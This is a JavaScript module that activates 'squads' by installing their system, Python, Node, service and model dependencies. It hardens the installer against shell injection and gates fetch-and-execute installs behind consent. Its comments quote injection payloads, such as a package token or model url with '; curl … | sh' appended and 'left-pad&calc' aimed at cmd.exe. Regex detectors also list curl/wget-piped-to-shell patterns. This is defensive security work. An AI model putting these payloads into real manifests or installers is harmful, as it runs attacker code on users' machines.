/**
 * activator.js — Squad activation + dependency installation.
 *
 * When a user asks to activate a squad, this module:
 *   1. Reads `<squad>/dependencies.yaml` (sidecar; not validated by SquadManifest)
 *   2. Walks each dependency category in order: system → python → node → services → custom_nodes → models → env_vars
 *   3. For each item: runs `check` command — if exit 0, mark `already_present`. Else runs `install`.
 *   4. Validates with health checks.
 *   5. Persists state at ~/.nirvana/squads-state/<slug>/activated.json
 *
 * Heavy installs (>1GB, sudo, network downloads) require user confirmation —
 * activator returns `confirmation_required` items so the calling agent can
 * surface them to the user before proceeding.
 *
 * Idempotent: re-running activation on an already-active squad is fast
 * (every check passes, nothing installs).
 */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync, spawnSync } = require('child_process');

const HOME = os.homedir();
const PLATFORM = process.platform; // 'darwin' | 'linux' | 'win32'
const SKILLS_ROOT = process.env.NIRVANA_SKILLS_DIR
  || (fs.existsSync(path.join(os.homedir(), '.nirvana', 'skills')) ? path.join(os.homedir(), '.nirvana', 'skills') : path.join(os.homedir(), '.claude', 'skills'));
const PATHS = require(path.join(SKILLS_ROOT, '_shared', 'lib', 'paths.js'));
// Every dependency this file installs goes to ONE place: ~/.nirvana. deps-home
// owns that policy — the store, the per-tool caches, and the environment that
// makes a package manager honour them. See its header for the measurements
// that forced the change.
//
// Resolved the same way PATHS is, plus a repo-relative fallback: this file runs
// both from the deployed tree (~/.nirvana/skills) and straight out of the
// checkout during tests, and only one of those two paths exists at a time.
const DEPS = (() => {
  const candidates = [
    path.join(SKILLS_ROOT, '_shared', 'lib', 'deps-home.ts'),
    path.resolve(__dirname, '..', '..', '_shared', 'lib', 'deps-home.ts'),
  ];
  for (const c of candidates) {
    try { if (fs.existsSync(c)) return require(c); } catch { /* next */ }
  }
  throw new Error(`deps-home not found (looked in: ${candidates.join(', ')})`);
})();
const SQUADS_DIR = process.env.SQUADS_DIR || PATHS.SQUADS_DIR;
const STATE_DIR = process.env.NIRVANA_STATE_DIR || PATHS.SQUADS_STATE_DIR;
// When the caller (activate-squad.ts) resolved a project-scoped squad,
// it passes the absolute path through this env var so we operate on the
// project copy instead of falling back to $SQUADS_DIR/<slug>.
const RESOLVED_SQUAD_PATH = process.env.NIRVANA_RESOLVED_SQUAD_PATH || null;

const YAML = require('yaml');

// ─────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────

function readYaml(filePath) {
  if (!YAML || !fs.existsSync(filePath)) return null;
  try { return YAML.parse(fs.readFileSync(filePath, 'utf8')); }
  catch (e) { return null; }
}

function checkCmd(cmd, opts = {}) {
  try {
    execSync(cmd, { stdio: 'pipe', timeout: opts.timeoutMs || 30000 });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

function runCmd(cmd, opts = {}) {
  // Verbose mode (set by CLI via env) overrides silent: stream output live so
  // an automation agent can see brew/git/pip progress in real time.
  const verbose = process.env.MAESTRO_ACTIVATOR_VERBOSE === '1';
  const stdio = verbose ? 'inherit' : (opts.silent ? 'pipe' : 'pipe');
  try {
    const out = execSync(cmd, {
      stdio,
      timeout: opts.timeoutMs || 600000,
      cwd: opts.cwd || undefined,
      // depsEnv FIRST, then the caller's overrides: a shell line from
      // `system[].install` or `post_install` inherits the pinned caches, so a
      // `npx puppeteer browsers install chrome` buried in a squad's hook lands
      // in ~/.nirvana/cache/puppeteer like everything else.
      env: { ...DEPS.depsEnv(process.env), ...(opts.env || {}) },
    });
    return { ok: true, output: out ? out.toString() : '' };
  } catch (e) {
    return { ok: false, error: e.message, code: e.status, stderr: e.stderr ? e.stderr.toString() : null };
  }
}

// A package list is DATA. `runCmd` builds a shell string, which is right for
// `system[].install.<platform>` — a squad author writes `brew install ffmpeg`
// there on purpose, behind the sudo / heavy-download consent gate — and wrong
// for `node:` and `python:`, whose entries are package tokens. Joined into a
// shell line, `- "left-pad; curl https://x/y.sh | sh"` stopped being a package
// name and became a second command, run by `nrv activate` with the user's own
// privileges. Quoting is not the fix either: the pip branch wrapped tokens in
// single quotes and an apostrophe inside a token still closed them.
//
// runArgv passes an argv ARRAY with no shell, so on macOS and Linux a token can
// only ever be one argument. Windows needs one more step, and leaving it to the
// runtime is what makes it dangerous.
//
// `pip`, `uv`, `curl` and `huggingface-cli` are real executables on Windows, so
// those paths spawn directly, with no shell anywhere. `npm`, `pnpm` and `yarn`
// ship as `.cmd` shims that no runtime starts without a shell — and the runtime
// will NOT quote the token for us. libuv quotes an argument only when it holds a
// space, tab or double quote:
//
//     if (NULL == wcspbrk(source, L" \t\"")) { /* No quotation needed */ }
//                                                (libuv, src/win/process.c)
//
// `@remotion/cli@^4.0.0` — a real spec, shipped today in creative-studio and
// genesis-circle — has none of the three, so it reaches cmd.exe raw, cmd eats
// `^` as its own escape character, and npm silently installs
// `@remotion/cli@4.0.0`. A different range, no error, nobody told. Swap the
// payload and the same hole runs `calc`: `left-pad&calc`.
//
// So the command line is built HERE, with every argument quoted, and handed to
// the runtime's shell path, which on Windows is `cmd.exe /d /s /c "<line>"`.
// `/s` strips the outer pair the runtime adds and leaves ours standing, so cmd
// sees each token quoted and `^`, `&`, `|`, `<`, `>`, `(`, `)` are data inside
// it. Four characters survive no quoting cmd.exe understands and are refused
// instead: `"` closes the quoting, `%` expands inside quotes, `!` expands when
// delayed expansion is on, and a newline ends the line. No spec in the shipped
// packs carries any of them; every metacharacter that appears in a real one
// (`^`, `>`, `|`, `[`, `]`) passes through as data.
const WINDOWS_UNQUOTABLE = /["%!\r\n]/;

/**
 * The cmd.exe line for an argv, or the token that cannot be quoted into one.
 * Exported for test: this is the whole Windows decision, and the spawn it feeds
 * cannot be exercised from a POSIX runner.
 */
function windowsShellPlan(argv) {
  for (const a of argv) {
    const m = WINDOWS_UNQUOTABLE.exec(String(a));
    if (m) return { ok: false, char: m[0], token: String(a) };
  }
  // The program name is left bare: a leading quote is what makes cmd apply its
  // own stripping rules to the rest of the line. Every argument after it is
  // quoted unconditionally, so the rule holds for tokens and flags alike.
  return { ok: true, line: [argv[0], ...argv.slice(1).map(a => `"${a}"`)].join(' ') };
}

function runArgv(argv, opts = {}) {
  const verbose = process.env.MAESTRO_ACTIVATOR_VERBOSE === '1';
  const common = {
    stdio: verbose ? 'inherit' : 'pipe',
    timeout: opts.timeoutMs || 600000,
    cwd: opts.cwd || undefined,
    env: { ...DEPS.depsEnv(process.env), ...(opts.env || {}) },
    windowsHide: true,
  };
  let r;
  // `windowsShim: true` marks the callers whose program is a `.cmd` on Windows.
  // Everyone else spawns argv directly on every platform.
  if (PLATFORM === 'win32' && opts.windowsShim) {
    const plan = windowsShellPlan(argv);
    if (!plan.ok) {
      return { ok: false, error:
        `refused on Windows: the token ${JSON.stringify(plan.token)} contains ${JSON.stringify(plan.char)}, ` +
        `which survives no quoting cmd.exe understands, and ${argv[0]} can only be started through cmd.exe there. ` +
        `Every other character, ^ and > and | included, is passed as data. ` +
        `Drop that one from the spec, or run the install yourself and re-activate.` };
    }
    r = spawnSync(plan.line, { ...common, shell: true });
  } else {
    r = spawnSync(argv[0], argv.slice(1), { ...common, shell: false });
  }
  if (r.error) return { ok: false, error: r.error.message };
  if (r.signal) return { ok: false, error: `${argv[0]} killed by ${r.signal}`, code: null, stderr: r.stderr ? r.stderr.toString() : null };
  if (r.status !== 0) {
    return { ok: false, error: `${argv[0]} exited ${r.status}`, code: r.status, stderr: r.stderr ? r.stderr.toString() : null };
  }
  return { ok: true, output: r.stdout ? r.stdout.toString() : '' };
}

// Human-readable rendering of an argv, for `--dry-run` output and error text
// ONLY. Nothing executes this string — that is the point of runArgv.
function displayCmd(argv) {
  return argv.map(a => (/[^\w@.\-+=/:]/.test(a) ? `'${a.replace(/'/g, "'\\''")}'` : a)).join(' ');
}

function ensureDir(p) {
  if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
}

function expandPath(p) {
  if (!p) return p;
  if (p.startsWith('~')) return path.join(HOME, p.slice(1));
  return p;
}

// Is this destination inside the one directory the engine is allowed to fill?
// Model weights and cloned services are dependencies too — they just arrive as
// files instead of packages — so an absolute path outside ~/.nirvana is
// reported rather than silently obeyed. It is not blocked: a squad that
// installs a real application (ComfyUI) at a path its own scripts expect has a
// reason, and the operator can see the exception in the activation record.
function outsideNirvana(dir) {
  if (!dir) return false;
  const root = path.resolve(DEPS.nirvanaHome());
  const target = path.resolve(dir);
  return target !== root && !target.startsWith(root + path.sep);
}

function getStatePath(slug) {
  return path.join(STATE_DIR, slug, 'activated.json');
}

function loadState(slug) {
  const p = getStatePath(slug);
  if (!fs.existsSync(p)) return null;
  try { return JSON.parse(fs.readFileSync(p, 'utf8')); }
  catch { return null; }
}

function saveState(slug, state) {
  const p = getStatePath(slug);
  ensureDir(path.dirname(p));
  fs.writeFileSync(p, JSON.stringify(state, null, 2));
  return p;
}

// ─────────────────────────────────────────────────────────────────────
// Per-category installers
// ─────────────────────────────────────────────────────────────────────

// Tolerates the multiple dependency shapes that dependencies.yaml files use
// across squads: {manager, packages:[strings]}, {manager, packages:[{name,version,global,check}]},
// bare arrays of either, and version-bearing strings like "ffmpeg >= 6.0".
function depToToken(item, eco) {
  if (typeof item === 'string') {
    const s = item.trim();
    return eco === 'pip' ? s.replace(/\s+/g, '') : s;
  }
  if (item && typeof item === 'object' && item.name) {
    const name = String(item.name).trim();
    const ver = item.version ? String(item.version).replace(/\s+/g, '') : '';
    if (!ver) return name;
    if (eco === 'npm') return `${name}@${ver}`;
    return /^[<>=~!]/.test(ver) ? `${name}${ver}` : `${name}==${ver}`;
  }
  return null;
}

function normalizeDepSpec(spec, defaultManager) {
  // Returns { manager, global, raw:[item], checks:[string|null] } or null.
  if (!spec) return null;
  let list, manager = defaultManager, glob = false;
  if (Array.isArray(spec)) {
    list = spec;
  } else if (Array.isArray(spec.packages)) {
    list = spec.packages; manager = spec.manager || defaultManager; glob = !!spec.global;
  } else {
    return null;
  }
  const raw = list.filter(Boolean);
  if (raw.length === 0) return null;
  const objGlobal = raw.some(x => x && typeof x === 'object' && x.global);
  const checks = raw.map(x => (x && typeof x === 'object' && x.check) ? x.check : null);
  return { manager, global: glob || objGlobal, raw, checks };
}

function allChecksPass(norm) {
  if (!norm.checks.length || norm.checks.some(c => !c)) return false;
  return norm.checks.every(c => checkCmd(c).ok);
}

// Fetch-and-execute detection for `system[].install.<platform>`.
//
// That field IS a shell line by design — `brew install ffmpeg` is what a squad
// author should write there — and the consent gate in front of it only ever
// matched `sudo`. So `curl -fsSL https://bun.sh/install | bash`, which ships
// today in brandcraft and grok-studio-nirvana, ran on the buyer's machine with
// no prompt at all: a third party's script, fetched and executed, because
// someone asked to install dependencies. The exit-code contract already
// promised 2 for "heavy installs", so this fills a promise rather than
// inventing one.
//
// The line the detector draws is fetch-and-EXECUTE. Downloading is not
// executing: `curl -o model.bin <url>`, `brew install`, `apt-get install` and
// `winget install` stay untouched, because a gate that fires on ordinary
// installs is a gate everyone learns to pass with --confirm-heavy without
// reading it.
const FETCHERS = String.raw`curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod`;
const INTERPRETERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|perl|ruby|iex|Invoke-Expression`;
// Anything that runs a file, for the two-step shape: the interpreters above plus
// the ones that only ever appear as stage two (`node`, `powershell`, `msiexec`,
// `installer`) and a bare `./thing`.
const RUNNERS = String.raw`bash|sh|zsh|dash|ksh|fish|python3?|node|perl|ruby|powershell|pwsh|msiexec|installer|iex|Invoke-Expression`;
// Command position: start of line, or after `;`, `&`, `&&`, `|`, `||`, `(` or a
// newline, with any `sudo -E` / `env -i` / `exec` prefix skipped. Without this
// anchor, a PATH like `/tmp/sh` would read as an invocation of `sh`.
const CMD_POSITION = String.raw`(?:^|[;&|(\n])\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*`;
const URL_IN_COMMAND = /https?:\/\/[^\s'"|)>]+/i;
const FETCHER_PRESENT = new RegExp(String.raw`\b(?:${FETCHERS})\b`, 'i');

const DIRECT_FORMS = [
  // curl … | bash · wget -qO- … | sh · irm … | iex · … | sudo -E bash -
  // The prefix group matters: `| sudo -E bash -` is the nodesource shape, and a
  // detector that only allowed a bare `sudo` would wave it through.
  new RegExp(String.raw`\b(?:${FETCHERS})\b[\s\S]*?\|\s*(?:(?:sudo|env|command|exec)(?:\s+-{1,2}\S+)*\s+)*(${INTERPRETERS})\b`, 'i'),
  // bash <(curl …) · sh <(wget …)
  new RegExp(String.raw`\b(${INTERPRETERS})\b[^\n]*?<\(\s*(?:${FETCHERS})\b`, 'i'),
  // sh -c "$(curl …)" · eval "$(curl …)" · eval `curl …`
  new RegExp(String.raw`\b(${INTERPRETERS}|eval)\b[^\n]*?(?:\$\(|` + '`' + String.raw`)\s*(?:${FETCHERS})\b`, 'i'),
];

// The two-step shape, which is the COMMON one in the wild: download an installer,
// then run it. `ebook-maestro-nirvana` ships it today in genesis-circle and
// publishing-knowledge — curl a zip, unzip it, `sh` the file that came out — and
// no pipe or substitution appears anywhere in it. The risk is identical to
// `curl | bash`: if the host is compromised, the buyer runs whatever it served.
const TWO_STAGE_RUN = new RegExp(CMD_POSITION + String.raw`(?:(${RUNNERS})\b|(\.{1,2}\/\S+))`, 'i');

/**
 * `{ url, shell, form }` when the command downloads something and runs it, else
 * null. `form` is the confidence, and it reaches the buyer: `direct` is a pipe
 * or a substitution and is not arguable; `two_stage` is a fetch and a runner in
 * the same command, which is a strong signal rather than a proof.
 *
 * Exported for test: the corpus it has to judge is the 232 install commands in
 * the shipped packs, and judging them must not mean running them.
 */
function fetchAndExecute(cmd) {
  const text = String(cmd || '');
  const url = URL_IN_COMMAND.exec(text);
  for (const form of DIRECT_FORMS) {
    const m = form.exec(text);
    if (m) return { url: url ? url[0] : null, shell: m[1], form: 'direct' };
  }
  if (!url || !FETCHER_PRESENT.test(text)) return null;
  const run = TWO_STAGE_RUN.exec(text);
  if (!run) return null;
  return { url: url[0], shell: run[1] || run[2], form: 'two_stage' };
}

function installSystem(dep, dryRun, confirmHeavy) {
  // Bare prereq string (e.g. "ffmpeg >= 6.0", "node >= 20"): we can only verify
  // presence — auto-installing a system tool needs a package-manager mapping we
  // don't have, so a miss is surfaced (non-blocking), not failed.
  if (typeof dep === 'string') {
    const tool = dep.trim().split(/[\s<>=!~]/)[0];
    if (!tool) return { name: dep, status: 'skipped', kind: 'system' };
    const present = checkCmd(`command -v ${tool}`).ok;
    return present
      ? { name: tool, status: 'already_present', kind: 'system' }
      : { name: tool, status: 'missing_system_tool', kind: 'system', spec: dep,
          note: `Prereq '${tool}' not found on PATH. Install it (brew/apt/winget) and re-activate.` };
  }
  const checkResult = checkCmd(dep.check);
  if (checkResult.ok) {
    return { name: dep.name, status: 'already_present', kind: 'system' };
  }
  const installCmd = (dep.install || {})[PLATFORM];
  if (!installCmd) {
    return { name: dep.name, status: 'install_unsupported_platform', kind: 'system', platform: PLATFORM };
  }
  if (dryRun) {
    return { name: dep.name, status: 'would_install', kind: 'system', cmd: installCmd };
  }
  // The exit-code contract promises 2 for "heavy installs / sudo", but until
  // now nothing ever detected sudo: a sudo-needing install either ran and
  // failed noisily or was skipped as a warning, and the caller saw exit 0
  // with a hard dependency still pending (VPS field report, 2026-08-21).
  // Running AS root, the sudo prefix is dropped (minimal containers have no
  // sudo binary, and root does not need it). Running unprivileged, a sudo
  // command requires --confirm-heavy — the same consent gate as large
  // downloads — otherwise it is a confirmation_required item (exit 2).
  //
  // Fetching a remote script and executing it goes through the SAME gate, for
  // the same reason: it is the machine doing something the person who typed
  // `nrv activate` did not see coming. Both reasons are reported together, and
  // the item carries the exact command, because that is the only thing the
  // buyer can actually decide on.
  let effectiveCmd = installCmd;
  const needsSudo = /(^|\s|&&|\|\||;)\s*sudo\s+/.test(installCmd);
  const isRoot = typeof process.getuid === 'function' && process.getuid() === 0;
  const fetchExec = fetchAndExecute(installCmd);
  if (needsSudo && isRoot) {
    effectiveCmd = installCmd.replace(/(^|\s|&&|\|\||;)(\s*)sudo\s+/g, '$1$2');
  }
  const reasons = [];
  if (needsSudo && !isRoot) reasons.push('runs as root through sudo');
  if (fetchExec) {
    reasons.push(fetchExec.form === 'direct'
      ? `downloads ${fetchExec.url || 'a remote address'} and executes it with ${fetchExec.shell}`
      : `downloads ${fetchExec.url} and then runs ${fetchExec.shell} in the same command — two steps rather than a pipe, so read it before accepting`);
  }
  if (reasons.length > 0 && !confirmHeavy) {
    return {
      name: dep.name,
      status: 'confirmation_required',
      kind: 'system',
      cmd: installCmd,
      needs_sudo: needsSudo && !isRoot,
      fetches: fetchExec ? fetchExec.url : null,
      executes_with: fetchExec ? fetchExec.shell : null,
      execution_form: fetchExec ? fetchExec.form : null,
      reason: `Consent needed before this runs: it ${reasons.join(', and it ')}.\n`
        + `  ${installCmd}\n`
        + `  Re-run with --confirm-heavy to accept it, or install it yourself and re-activate.`,
    };
  }
  const installResult = runCmd(effectiveCmd);
  if (!installResult.ok) {
    return { name: dep.name, status: 'install_failed', kind: 'system', error: installResult.error };
  }
  const recheck = checkCmd(dep.check);
  return {
    name: dep.name,
    status: recheck.ok ? 'installed' : 'install_completed_but_check_failed',
    kind: 'system',
  };
}

function installPython(spec, dryRun) {
  const norm = normalizeDepSpec(spec, 'pip');
  if (!norm) return { status: 'no_python_deps' };
  const tokens = norm.raw.map(x => depToToken(x, 'pip')).filter(Boolean);
  if (tokens.length === 0) return { status: 'no_python_deps' };
  if (allChecksPass(norm)) return { status: 'already_present', kind: 'python', packages: tokens };
  const manager = norm.manager === 'uv' ? 'uv' : 'pip';
  // An explicit venv (`use_squad_venv`) is a deliberate isolation choice by the
  // squad author and is honoured. Everything else goes to the shared Python
  // home: `--user` with PYTHONUSERBASE=~/.nirvana/python (set by depsEnv), which
  // both installs and imports from there. Left alone, `pip install --user` wrote
  // to ~/Library/Python — 2.3 GB there on the owner's machine — and a
  // `target_dir` synthesized from a squad's requirements.txt wrote INTO the
  // squad, which is the same scatter as the node case.
  const venv = expandPath((!Array.isArray(spec) && spec.use_squad_venv) ? '.venv' : null);

  let argv;
  if (manager === 'uv') {
    argv = ['uv', 'pip', 'install', ...(venv ? [] : ['--target', DEPS.pythonHome()]), ...tokens];
  } else {
    // pip vs pip3 fallback (macOS system python often only ships pip3).
    const pipBin = checkCmd('pip --version').ok ? 'pip' : (checkCmd('pip3 --version').ok ? 'pip3' : 'pip');
    argv = [pipBin, 'install', ...(venv ? [] : ['--user']), ...tokens];
  }
  if (dryRun) return { status: 'would_install', kind: 'python', manager, home: venv || DEPS.pythonHome(), cmd: displayCmd(argv), argv };
  const r = runArgv(argv, { cwd: venv || undefined });
  return {
    status: r.ok ? 'installed' : 'install_failed',
    kind: 'python',
    manager,
    packages: tokens,
    error: r.ok ? null : r.error,
  };
}

function installNode(spec, dryRun, squadDir) {
  const norm = normalizeDepSpec(spec, 'npm');
  if (!norm) return { status: 'no_node_deps' };
  const tokens = norm.raw.map(x => depToToken(x, 'npm')).filter(Boolean);
  if (tokens.length === 0) return { status: 'no_node_deps' };
  if (allChecksPass(norm)) return { status: 'already_present', kind: 'node', manager: norm.manager, global: norm.global, packages: tokens };
  const g = norm.global;

  // GLOBAL installs are the carve-out and stay as they are: `npm i -g wrangler`
  // asks for a command on the machine's PATH, which is the same class as
  // `brew install ffmpeg`. Redirecting those would put binaries somewhere
  // nothing looks, and setting npm_config_prefix to fix that breaks nvm.
  if (g) {
    const manager = norm.manager || 'npm';
    const argv = manager === 'pnpm' ? ['pnpm', 'add', '-g', ...tokens]
               : manager === 'yarn' ? ['yarn', 'global', 'add', ...tokens]
               : ['npm', 'install', '-g', ...tokens];
    if (dryRun) return { status: 'would_install', kind: 'node', manager, global: true, cmd: displayCmd(argv), argv };
    const r = runArgv(argv, { windowsShim: true });
    return { status: r.ok ? 'installed' : 'install_failed', kind: 'node', manager, global: true, packages: tokens, error: r.ok ? null : r.error };
  }

  // LOCAL installs go to the shared store at ~/.nirvana/node_modules, never to
  // the squad. This used to run the package manager inside the squad dir on the
  // reasoning that it kept the ~/squads ROOT clean — which it did, by writing
  // one full tree per squad instead. brandcraft alone cost 276 MB there, and
  // its byte-identical twin in the pack source cost another 276 MB.
  //
  // `spec.cwd` is now advisory: a squad that declares
  // `cwd: "${SQUADS_DIR}/<slug>"` (the shape the old template taught) gets the
  // store anyway, and the ignored value is reported so the author can drop it.
  const declaredCwd = expandPath(!Array.isArray(spec) ? spec.cwd : null);
  if (dryRun) {
    const plan = DEPS.install(tokens, { dryRun: true });
    return { status: 'would_install', kind: 'node', manager: 'bun', global: false, store: DEPS.depsStore(), cmd: plan.cmd, argv: plan.argv, packages: tokens, ignored_cwd: declaredCwd || null };
  }
  const res = DEPS.install(tokens);
  // The squad still has to RESOLVE what was installed. One symlink does that
  // for every runtime and loader, and keeps a single physical copy on disk.
  const linked = squadDir ? DEPS.link(squadDir) : { status: 'skipped' };
  return {
    status: res.status === 'failed' ? 'install_failed' : (res.status === 'already_present' ? 'already_present' : 'installed'),
    kind: 'node',
    manager: 'bun',
    global: false,
    store: DEPS.depsStore(),
    packages: tokens,
    linked: linked.status,
    ignored_cwd: declaredCwd || null,
    error: res.error || null,
  };
}

// Sub-app installer: some squads ship self-contained sub-projects with their
// OWN package.json (e.g. dashboard/, scripts/). The root install can't reach
// them, so a squad would look "activated" while its dashboard/renderer can't
// run. This installs each sub-app IN ITS OWN dir (so a squad is fully runnable
// after `nrv activate`, not just its root deps). Skips non-app dirs and any
// sub-app that already has node_modules.
const SUBAPP_SKIP = new Set(['node_modules', 'templates', 'examples', 'example', 'fixtures', 'references', 'schemas', 'docs', 'test', 'tests', '__tests__', 'data', 'assets', '.git']);
function installSubApps(squadDir, dryRun) {
  const out = [];
  let entries;
  try { entries = fs.readdirSync(squadDir, { withFileTypes: true }); } catch { return out; }
  for (const e of entries) {
    if (!e.isDirectory() || e.name.startsWith('.') || SUBAPP_SKIP.has(e.name)) continue;
    const sub = path.join(squadDir, e.name);
    const pkgPath = path.join(sub, 'package.json');
    if (!fs.existsSync(pkgPath)) continue;

    // A pre-existing REAL node_modules is somebody's installed tree; leave it
    // and let `nrv deps adopt` fold it into the store. A symlink means this
    // sub-app is already pointed at the store.
    let existing = null;
    try { existing = fs.lstatSync(path.join(sub, 'node_modules')); } catch { /* absent */ }
    if (existing && !existing.isSymbolicLink()) { out.push({ dir: e.name, status: 'stray_tree', kind: 'subapp', hint: 'nrv deps adopt' }); continue; }

    let tokens = [];
    try {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const deps = { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) };
      tokens = Object.entries(deps).map(([n, v]) => `${n}@${v}`);
    } catch { out.push({ dir: e.name, status: 'unreadable_manifest', kind: 'subapp' }); continue; }
    if (tokens.length === 0) { out.push({ dir: e.name, status: 'no_deps', kind: 'subapp' }); continue; }

    // Same rule as the squad root: install ONCE into the shared store, then
    // link. Previously this ran a package manager inside every sub-app dir, so
    // one squad could produce three separate node_modules trees
    // (instagram-intelligence-nirvana: dashboard/ + scripts/).
    if (dryRun) {
      const plan = DEPS.install(tokens, { dryRun: true });
      out.push({ dir: e.name, status: 'would_install', kind: 'subapp', cmd: plan.cmd, packages: tokens });
      continue;
    }
    const res = DEPS.install(tokens);
    const linked = DEPS.link(sub);
    out.push({
      dir: e.name,
      status: res.status === 'failed' ? 'install_failed' : (res.status === 'already_present' ? 'already_present' : 'installed'),
      kind: 'subapp', manager: 'bun', store: DEPS.depsStore(), linked: linked.status,
      error: res.error || null,
    });
  }
  return out;
}

function installService(svc, dryRun) {
  const installDir = expandPath(svc.install_dir) || path.join(DEPS.nirvanaHome(), 'services', String(svc.name || 'unnamed'));
  const alreadyCloned = installDir && fs.existsSync(installDir);

  // 1. Health check first — service may already be running
  if (svc.health_check) {
    const h = checkCmd(svc.health_check);
    if (h.ok) return { name: svc.name, status: 'already_running', kind: 'service' };
  }

  // 2. Clone if missing. `repo` and `install_dir` are manifest DATA, like the
  // package tokens and the model url — argv, never a shell line. (`install_cmd`
  // below is the opposite: a shell line the squad author wrote on purpose.)
  if (svc.repo && !alreadyCloned) {
    const argv = ['git', 'clone', String(svc.repo), ...(installDir ? [installDir] : [])];
    if (dryRun) return { name: svc.name, status: 'would_clone', kind: 'service', cmd: displayCmd(argv), argv };
    const r = runArgv(argv);
    if (!r.ok) return { name: svc.name, status: 'clone_failed', kind: 'service', error: r.error };
  }

  // 3. Install command
  if (svc.install_cmd) {
    if (dryRun) return { name: svc.name, status: 'would_install', kind: 'service', cmd: svc.install_cmd, cwd: installDir };
    const r = runCmd(svc.install_cmd, { cwd: installDir });
    if (!r.ok) return { name: svc.name, status: 'install_failed', kind: 'service', error: r.error };
  }

  // 4. Note: starting the service is the user's responsibility (long-running process).
  return {
    name: svc.name,
    status: 'installed_not_started',
    kind: 'service',
    install_dir: installDir,
    start_cmd: svc.start_cmd || null,
    health_check: svc.health_check || null,
    note: 'Service installed but NOT started. Run start_cmd manually in a separate terminal, then re-run activator to verify health.',
  };
}

function installCustomNodes(nodes, dryRun) {
  if (!Array.isArray(nodes) || nodes.length === 0) return { status: 'no_custom_nodes' };
  const results = [];
  for (const node of nodes) {
    const dst = path.join(expandPath(node.install_to || '~/comfyui/custom_nodes'), node.name || path.basename(node.repo, '.git'));
    if (fs.existsSync(dst)) {
      results.push({ name: node.name, status: 'already_present', kind: 'custom_node' });
      continue;
    }
    // Same rule as services: `repo` is data out of the manifest.
    const argv = ['git', 'clone', String(node.repo), dst];
    if (dryRun) {
      results.push({ name: node.name, status: 'would_clone', kind: 'custom_node', cmd: displayCmd(argv), argv });
      continue;
    }
    const r = runArgv(argv);
    results.push({ name: node.name, status: r.ok ? 'installed' : 'clone_failed', kind: 'custom_node', error: r.ok ? null : r.error });
  }
  return { status: 'done', kind: 'custom_nodes', items: results };
}

function installModels(models, dryRun, opts = {}) {
  if (!Array.isArray(models) || models.length === 0) return { status: 'no_models' };
  const results = [];
  for (const m of models) {
    // Unspecified destination now defaults INSIDE ~/.nirvana instead of
    // wherever the caller happened to be.
    const dst = expandPath(m.install_to) || path.join(DEPS.nirvanaHome(), 'models', String(m.name || 'unnamed'));
    const fileTarget = m.filename ? path.join(dst, m.filename) : dst;
    if (m.filename && fs.existsSync(fileTarget)) {
      results.push({ name: m.name, status: 'already_present', kind: 'model' });
      continue;
    }
    const sizeGb = m.size_gb || 0;
    if (sizeGb > 1 && !opts.confirmHeavyDownloads) {
      results.push({
        name: m.name,
        status: 'confirmation_required',
        kind: 'model',
        size_gb: sizeGb,
        source: m.source,
        repo: m.repo,
        install_to: dst,
        reason: `Large download (${sizeGb} GB). User must confirm.`,
      });
      continue;
    }
    // Same field-is-data rule as `node:` and `python:`: `repo`, `url`, `filename`
    // and `install_to` come out of dependencies.yaml, so a shell line here would
    // let `url: "https://x/m.bin; curl evil | sh"` run its own command. argv also
    // fixes the quieter half of the old bug — an install path with a space used
    // to split into two arguments.
    let argv;
    if (m.source === 'huggingface') {
      argv = ['huggingface-cli', 'download', String(m.repo), ...(m.filename ? [String(m.filename)] : []), '--local-dir', dst];
    } else if (m.source === 'url') {
      argv = ['curl', '-L', '-o', fileTarget, String(m.url)];
    } else {
      results.push({ name: m.name, status: 'unknown_source', kind: 'model', source: m.source });
      continue;
    }
    if (dryRun) {
      results.push({ name: m.name, status: 'would_download', kind: 'model', cmd: displayCmd(argv), argv });
      continue;
    }
    ensureDir(dst);
    const r = runArgv(argv, { timeoutMs: 7200000 });
    results.push({ name: m.name, status: r.ok ? 'downloaded' : 'download_failed', kind: 'model', install_to: dst, outside_nirvana: outsideNirvana(dst) || undefined, error: r.ok ? null : r.error });
  }
  return { status: 'done', kind: 'models', items: results };
}

function checkEnvVars(vars) {
  // Accept an array of {name,required,description}/strings, OR the
  // {required:[...], optional:[...]} shape that some squads use.
  let list = [];
  if (Array.isArray(vars)) {
    list = vars;
  } else if (vars && typeof vars === 'object') {
    for (const v of (vars.required || [])) list.push(typeof v === 'string' ? { name: v, required: true } : { ...v, required: true });
    for (const v of (vars.optional || [])) list.push(typeof v === 'string' ? { name: v, required: false } : { ...v, required: false });
  }
  if (list.length === 0) return { status: 'no_env_vars' };
  const results = [];
  for (const v of list) {
    const name = typeof v === 'string' ? v : v.name;
    const required = typeof v === 'object' ? !!v.required : false;
    const present = !!process.env[name];
    results.push({
      name,
      status: present ? 'set' : (required ? 'missing_required' : 'missing_optional'),
      description: (typeof v === 'object' ? v.description : null) || null,
    });
  }
  return { status: 'done', kind: 'env_vars', items: results };
}

function runPostInstall(commands, dryRun) {
  if (!Array.isArray(commands) || commands.length === 0) return { status: 'no_post_install' };
  const results = [];
  for (const cmd of commands) {
    if (dryRun) { results.push({ cmd, status: 'would_run' }); continue; }
    const r = runCmd(cmd, { timeoutMs: 120000 });
    results.push({ cmd, status: r.ok ? 'ok' : 'failed', error: r.ok ? null : r.error });
  }
  return { status: 'done', kind: 'post_install', items: results };
}

// ─────────────────────────────────────────────────────────────────────
// Public API
// ─────────────────────────────────────────────────────────────────────

function _synthesizeFromManifests(squadDir, slug) {
  // Look for standard-format manifests in the squad dir; if any are present,
  // synthesize a dependencies.yaml-equivalent object so activation can still
  // run. Cached at ~/.nirvana/squads-state/<slug>/synth-deps.yaml for the
  // user to inspect and optionally promote to a real sidecar.
  const synth = { schema_version: '1.0', _synthesized: true, _sources: [] };

  // package.json → node.packages
  const pkgPath = path.join(squadDir, 'package.json');
  if (fs.existsSync(pkgPath)) {
    try {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      const deps = { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) };
